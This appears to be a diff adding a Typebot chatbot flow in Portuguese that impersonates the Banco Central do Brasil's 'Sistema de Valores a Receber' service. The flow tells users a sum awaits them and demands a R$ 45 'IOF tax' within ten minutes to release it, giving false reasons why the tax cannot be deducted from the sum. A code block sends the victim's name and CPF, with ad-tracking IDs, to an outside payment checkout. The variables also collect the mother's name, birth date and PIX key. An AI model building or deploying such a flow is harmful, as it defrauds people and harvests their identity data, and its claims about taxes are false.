+                    "bold": true
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "io0370mfucjng00buqy5soe1",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "2"
+          }
+        },
+        {
+          "id": "ultoucqtxpbx8ik9t38k4q07",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "og3xq8kjou",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "ATENÇÃO:",
+                    "bold": true
+                  },
+                  {
+                    "text": " O Sistema de Valores a Receber iniciou o repasse do seu valor de "
+                  },
+                  {
+                    "text": "{{valor}}",
+                    "bold": true
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "pzwtje5moopj48y75oxcoava",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "2"
+          }
+        },
+        {
+          "id": "iz9i4ivhi0dl1gbspsa2cg00",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "3dzvehc5tx",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Para liberar o seu valor é necessário realizar o pagamento do Imposto de Operações Financeiras (IOF) em até 10 minutos."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "ckywl042yb2wtyl3vvie2ae9",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "1"
+          }
+        },
+        {
+          "id": "pde5onrhqvffk3z0i11vb9kq",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "702gsmm03z",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Clique no botão abaixo para entender o motivo do pagamento desse imposto."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "k87y8sj7bmrdhysho9j3ojat",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "wkpl6qalignqc0sckp9s93mn",
+              "content": "PORQUE TENHO QUE PAGAR ESSE IMPOSTO?"
+            }
+          ],
+          "options": {
+            "isMultipleChoice": false,
+            "isSearchable": false,
+            "variableId": "v7gajyj277rpjaf1g6i32nl6v"
+          },
+          "outgoingEdgeId": "3p6f25wuec9kvcdv9pxmj6nr"
+        }
+      ]
+    },
+    {
+      "id": "fbuz4x4asc543cx5az2n5qdk",
+      "title": "Detalhamento IOF",
+      "graphCoordinates": {
+        "x": 3850,
+        "y": 0
+      },
+      "blocks": [
+        {
+          "id": "gtzxgw2ezxmkpun00ooo2pux",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "kpi410jojn",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "IMPORTANTE:",
+                    "bold": true
+                  },
+                  {
+                    "text": " Este é o último passo para você receber seu resgate!"
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "bwfz618zdunvg8y2589svaob",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "2"
+          }
+        },
+        {
+          "id": "npwx1bpkwhsq53pz1652m5to",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "sxd2ajb58q",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Detalhamento sobre os impostos:",
+                    "bold": true
+                  }
+                ]
+              },
+              {
+                "id": "j654m0phx2",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Para receber seu valor de {{valor}}, é necessário efetuar o pagamento do Imposto IOF, que é calculado de acordo com o valor total do saque."
+                  }
+                ]
+              },
+              {
+                "id": "0xbqf0m49e",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "- IOF (Imposto sobre Operações Financeiras 0,57%)"
+                  }
+                ]
+              },
+              {
+                "id": "tqs0awrv0b",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "R$ 45,00",
+                    "bold": true
+                  }
+                ]
+              },
+              {
+                "id": "pb484lw7pc",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Valor total do Imposto: "
+                  },
+                  {
+                    "text": "R$ 45,00",
+                    "bold": true
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "xg0rijy3wcih7dgfnaxcgmvi",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "5"
+          }
+        },
+        {
+          "id": "6g2rm7b5vjplbp27k5j20mvz",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "gg5tyuydub",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "⚠️ Seu dinheiro está vinculado ao seu CPF e somente você pode acessá-lo. Portanto, não podemos descontar o valor do imposto diretamente do seu valor disponível. O pagamento do imposto deve ser feito separadamente antes da liberação do saque."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "r61c8myekbaet4xibkri027j",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "3"
+          }
+        },
+        {
+          "id": "z108j2oley6fj06ebecqhep3",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "5ffabtrysc",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Somente após você finalizar o pagamento do Imposto IOF o Banco Central terá a autorização de realizar transferências de valor alto diante o monitoramento fiscal."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "krwcpzklabhigiclgx8v7hg2",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "2"
+          }
+        },
+        {
+          "id": "lxwm9q9fxi1f635vz3mwa5zf",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "ocjep2q8nk82imwkk583xac4",
+              "content": "CONCLUIR PAGAMENTO E LIBERAR SAQUE"
+            }
+          ],
+          "options": {
+            "isMultipleChoice": false,
+            "isSearchable": false,
+            "variableId": "v7gajyj277rpjaf1g6i32nl6v"
+          },
+          "outgoingEdgeId": "jurkyfw08c2k9xpaxffm95d6"
+        }
+      ]
+    },
+    {
+      "id": "zj7fh4in81qdks022y80geyp",
+      "title": "Checkout",
+      "graphCoordinates": {
+        "x": 4200,
+        "y": 0
+      },
+      "blocks": [
+        {
+          "id": "4s4a1eyn67kjp3zpvzq4a26i",
+          "type": "Code",
+          "options": {
+            "content": "const urlParams = new URLSearchParams(window.location.search);\n\n// {{gclid}} SEM ASPAS de proposito: entre aspas o Typebot manda o ID da variavel.\nconst cid = String({{gclid}} || {{gbraid}} || {{wbraid}}\n  || urlParams.get('gclid') || urlParams.get('gbraid') || urlParams.get('wbraid') || '');\n\nconst nome = String({{nome}} || '');\nconst doc  = String({{cpf}} || '');\n\nconst parts = [];\nif (cid) {\n  parts.push('src=' + encodeURIComponent(cid));\n  // utm_content = CARRIER: o webhook do TopperPay nao tem campo src, mas devolve os utm_*.\n  parts.push('utm_content=' + encodeURIComponent(cid));\n} else if (urlParams.has('utm_content')) {\n  parts.push('utm_content=' + encodeURIComponent(urlParams.get('utm_content')));\n}\n['utm_source', 'utm_medium', 'utm_campaign', 'utm_term'].forEach(k => {\n  if (urlParams.has(k)) parts.push(k + '=' + encodeURIComponent(urlParams.get(k)));\n});\nif (nome) parts.push('name=' + encodeURIComponent(nome));\nif (doc)  parts.push('document=' + encodeURIComponent(doc));\n\nconst query = parts.join('&');\n// checkout PROPRIO desta oferta: produto \"Imposto IOF\" R$ 45,00 (PIX), salesPage meubeneficio.sbs/chat/\nwindow.location.href = 'https://pay.asegupag.com/checkout/f8e9949c-04a7-475e-8876-806f252b8fa2' + (query ? '?' + query : '');"
+          }
+        }
+      ]
+    }
+  ],
+  "edges": [
+    {
+      "id": "ha41ovdtv4o121u1pfmt77yv",
+      "from": {
+        "eventId": "jlwkp6odq7tnp5en0hl3qc3d"
+      },
+      "to": {
+        "groupId": "xg7vr2i0b6r6tqs9q2eyw9ox"
+      }
+    },
+    {
+      "id": "uwu42c2xu2sv49xwnpoe188l",
+      "from": {
+        "blockId": "nj3xu8id8mae5rrxxtpve3r4"
+      },
+      "to": {
+        "groupId": "0i3k95tb3vxau2hdez1tu0sr"
+      }
+    },
+    {
+      "id": "0end3m7bznskzvr34429qd80",
+      "from": {
+        "blockId": "igxehl51d8whoed8flghdi2h",
+        "itemId": "jxibvn760435yslt89kqwv4m"
+      },
+      "to": {
+        "groupId": "hs93x7j1s49o98xoxaiaz4qu"
+      }
+    },
+    {
+      "id": "jomah3z3krag30d0w5us8ggp",
+      "from": {
+        "blockId": "igxehl51d8whoed8flghdi2h"
+      },
+      "to": {
+        "groupId": "1uyczaqktq5rastzcs6ji62h"
+      }
+    },
+    {
+      "id": "07t4kz6vmj9i2dxay1of45d9",
+      "from": {
+        "blockId": "yzmu4k16fu9vq8incxigu8bw"
+      },
+      "to": {
+        "groupId": "0i3k95tb3vxau2hdez1tu0sr"
+      }
+    },
+    {
+      "id": "05a2mfhcn27q2q4z86ddh3t1",
+      "from": {
+        "blockId": "r1d2922lb987rjpjumtdhfu0"
+      },
+      "to": {
+        "groupId": "fryrwz93dya0j0cc7397gbhw"
+      }
+    },
+    {
+      "id": "pp2y87m365gzlhi2tcxjzo0i",
+      "from": {
+        "blockId": "dy5rglb2h59b8eey6abi4p0e",
+        "itemId": "fyty4g8bq5es7o91n8b16sti"
+      },
+      "to": {
+        "groupId": "43mgnchyk5pe3qxtpbi6wbm9"
+      }
+    },
+    {
+      "id": "nrcotq7p0zexpvknaqun5e14",
+      "from": {
+        "blockId": "dy5rglb2h59b8eey6abi4p0e"
+      },
+      "to": {
+        "groupId": "mfkmkasbm1qzut70s5w6tm06"
+      }
+    },
+    {
+      "id": "f6e1h2pu3vvnadtld2w932g1",
+      "from": {
+        "blockId": "nfmp6ra5bobw2wuebnzlkdgl"
+      },
+      "to": {
+        "groupId": "fryrwz93dya0j0cc7397gbhw"
+      }
+    },
+    {
+      "id": "q7tqei32q8hdllr391jkr549",
+      "from": {
+        "blockId": "ybvzv7tgupazax6lyt4i74r8",
+        "itemId": "wk0okv3xdm48pcsx5o7pa48q"
+      },
+      "to": {
+        "groupId": "rsqofbq0kkm4bdy83sz8obk1"
+      }
+    },
+    {
+      "id": "3ujxw26gihdl0zqbcxzba82g",
+      "from": {
+        "blockId": "ybvzv7tgupazax6lyt4i74r8"
+      },
+      "to": {
+        "groupId": "0qaj1vzddiuhr5vslkgmpkpa"
+      }
+    },
+    {
+      "id": "ul1im3te9zvgqip1gf3s91d1",
+      "from": {
+        "blockId": "x0rdyxsr464u7m2wvgjq8dfi"
+      },
+      "to": {
+        "groupId": "mfkmkasbm1qzut70s5w6tm06"
+      }
+    },
+    {
+      "id": "1qzrkq1q8e4xejz7d6uyjxpr",
+      "from": {
+        "blockId": "hr4hwifrk2w60iqyryta5lxr"
+      },
+      "to": {
+        "groupId": "2fm7jjs068ctjro6bt5qj343"
+      }
+    },
+    {
+      "id": "ehh0rhcsc6s2836c7brfzrsp",
+      "from": {
+        "blockId": "hwq96brp2fsze5i0xmpbaq2x"
+      },
+      "to": {
+        "groupId": "dny6n9px4yuksmvomiaby2yy"
+      }
+    },
+    {
+      "id": "kjcc346nmgaxs2809mct6etk",
+      "from": {
+        "blockId": "njo82yso4een37ap36h389go"
+      },
+      "to": {
+        "groupId": "h8varxdifqwu6ksuzh6g69lo"
+      }
+    },
+    {
+      "id": "767hb2s2smjsfzic5keqaely",
+      "from": {
+        "blockId": "x4i2jw271fshdm3c9bgrb1at",
+        "itemId": "afzgiw5x3o6qvrlmlptutugw"
+      },
+      "to": {
+        "groupId": "dny6n9px4yuksmvomiaby2yy"
+      }
+    },
+    {
+      "id": "sycqnfstsar6hz4r10cjap37",
+      "from": {
+        "blockId": "x4i2jw271fshdm3c9bgrb1at"
+      },
+      "to": {
+        "groupId": "4o0ekkuesze8oj1y7k8ayfs7"
+      }
+    },
+    {
+      "id": "eu7fjppxdlomg8ypl9xu78r6",
+      "from": {
+        "blockId": "rihbvqdxcul3qs50ijk75c0u"
+      },
+      "to": {
+        "groupId": "jdh3gqlbic12jjt59lvk0zex"
+      }
+    },
+    {
+      "id": "3p6f25wuec9kvcdv9pxmj6nr",
+      "from": {
+        "blockId": "k87y8sj7bmrdhysho9j3ojat"
+      },
+      "to": {
+        "groupId": "fbuz4x4asc543cx5az2n5qdk"
+      }
+    },
+    {
+      "id": "jurkyfw08c2k9xpaxffm95d6",
+      "from": {
+        "blockId": "lxwm9q9fxi1f635vz3mwa5zf"
+      },
+      "to": {
+        "groupId": "zj7fh4in81qdks022y80geyp"
+      }
+    }
+  ],
+  "variables": [
+    {
+      "id": "vlq8kcz9dl8v63we7psxmozrp",
+      "name": "cpf",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vee4yzo0z582cwghirpqw5hlr",
+      "name": "nome",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vawe5x1fwu3yvo7zcrrzmz6zo",
+      "name": "mae",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vs1qyfia3goy6hh4i4ar2rgy2",
+      "name": "nasc",
+      "isSessionVariable": true
+    },
+    {
+      "id": "v3umur1o2yth6vgg6be4wswgj",
+      "name": "valor",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vhwzvcuhland7x8h2kvyqofks",
+      "name": "protocolo",
+      "isSessionVariable": true
+    },
+    {
+      "id": "v1hof9uddvzduupfzsm06ft56",
+      "name": "posMae",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vn9iul5s5o0xxkhuijk7n3mnj",
+      "name": "altMae1",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vffw8zm1ha6ewk4iq00qvwyab",
+      "name": "altMae2",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vtaeih2dand4hjciv0nb9az8y",
+      "name": "altMae3",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vwmt58mi0rpp90ahi8zyf056f",
+      "name": "altMae4",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vvfyc1h38wmzw74i6tdwxpvhw",
+      "name": "respMae",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vfdwf4guz0k4m9l5xrckhzazl",
+      "name": "posNasc",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vys5az3cb9mylhqeiev0zb2ym",
+      "name": "altNasc1",
+      "isSessionVariable": true
+    },
+    {
+      "id": "v0ahhhiar1j753mgtzoz6jtca",
+      "name": "altNasc2",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vwu3y5s9gi5t9yrzftzjmoiiu",
+      "name": "altNasc3",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vlzcmci98xojkb974xe4xysph",
+      "name": "altNasc4",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vp8becduyfxqavv9aa4c418i3",
+      "name": "respNasc",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vwiopadelxzocye0uefrduu2g",
+      "name": "tipoChave",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vmy3uv4gnmqzl53hvea5aypvd",
+      "name": "chavePix",
+      "isSessionVariable": true
+    },
+    {
+      "id": "v7gajyj277rpjaf1g6i32nl6v",
+      "name": "confirmaChave",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vc8ehb3st8yrtueouxld9owni",
+      "name": "gclid",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vp2fibdm2x9i17f09xzoob9tx",
+      "name": "gbraid",
+      "isSessionVariable": true
+    },
+    {
+      "id": "vedvpzc43sfa8abl7c7o11e5l",
+      "name": "wbraid",
+      "isSessionVariable": true
+    }
+  ],
+  "settings": {
+    "general": {
+      "isBrandingEnabled": false,
+      "isHideQueryParamsEnabled": false
+    },
+    "typingEmulation": {
+      "enabled": true,
+      "speed": 400,
+      "maxDelay": 2
+    },
+    "metadata": {
+      "title": "Sistema de Valores a Receber",
+      "description": "Atendimento do Banco Central do Brasil"
+    }
+  },
+  "theme": {
+    "general": {
+      "progressBar": {
+        "isEnabled": false
+      }
+    },
+    "chat": {
+      "container": {
+        "backgroundColor": "#ffffff",
+        "opacity": 1
+      },
+      "hostAvatar": {
+        "isEnabled": false
+      },
+      "guestAvatar": {
+        "isEnabled": false
+      },
+      "hostBubbles": {
+        "backgroundColor": "#F5F5F5",
+        "color": "#000000"
+      },
+      "guestBubbles": {
+        "backgroundColor": "#005CA9",
+        "color": "#FFFFFF"
+      },
+      "buttons": {
+        "backgroundColor": "#046f94",
+        "color": "#FFFFFF"
+      },
+      "buttonsInput": {
+        "layout": "vertical"
+      }
+    }
+  }
+}
